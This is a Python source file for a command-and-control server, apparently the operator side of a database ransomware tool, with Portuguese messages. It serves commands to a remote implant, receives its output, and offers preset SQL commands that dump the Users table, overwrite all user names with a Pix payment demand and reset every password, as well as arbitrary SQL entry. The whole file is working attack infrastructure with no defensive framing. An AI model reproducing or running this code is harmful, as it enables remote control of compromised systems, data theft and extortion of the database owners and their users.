from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import ssl
import threading

current_command = ">>>"
result_received = ""

class SimpleHandler(BaseHTTPRequestHandler):
    def _set_headers(self, status=200, content_type="application/json"):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.end_headers()

    def do_GET(self):
        if self.path == "/api/v1/command":
            self._set_headers()
            response = json.dumps({"command": current_command})
            self.wfile.write(response.encode())
        else:
            self._set_headers(404)
            self.wfile.write(b"Not Found")

    def do_POST(self):
        if self.path == "/api/v1/result":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            data = json.loads(body.decode())

            print("\nResultado recebido do ransomware:")
            print(data.get("output", "sem saída"))

            self._set_headers()
            self.wfile.write(json.dumps({"status": "Recebido"}).encode())
        else:
            self._set_headers(404)
            self.wfile.write(b"Not Found")

def start_server():
    server_address = ("0.0.0.0", 8443)
    httpd = HTTPServer(server_address, SimpleHandler)

    # context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    # httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print("Servidor de controle iniciado em https://localhost:8443")
    httpd.serve_forever()

if __name__ == "__main__":
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()

    pre_defined = {
        "1": "SHOW TABLES",
        "2": "SELECT * FROM Users",
        "3": "UPDATE Users SET name = 'Passa o pix comedia'",
        "4": "UPDATE Users SET password = '01788089111'",
    }

    while True:
        print("\nComandos disponíveis:")
        for k, v in pre_defined.items():
            print(f"{k} - {v}")
        print("ou digite um SQL manualmente")
        print("Digite 'stop' para encerrar\n")

        option = input(">>> ")

        if option.lower() == "stop":
            print("Encerrando servidor...")
            break
        elif option in pre_defined:
            current_command = pre_defined[option]
        else:
            current_command = option

        print(f"Comando atualizado: {current_command}")
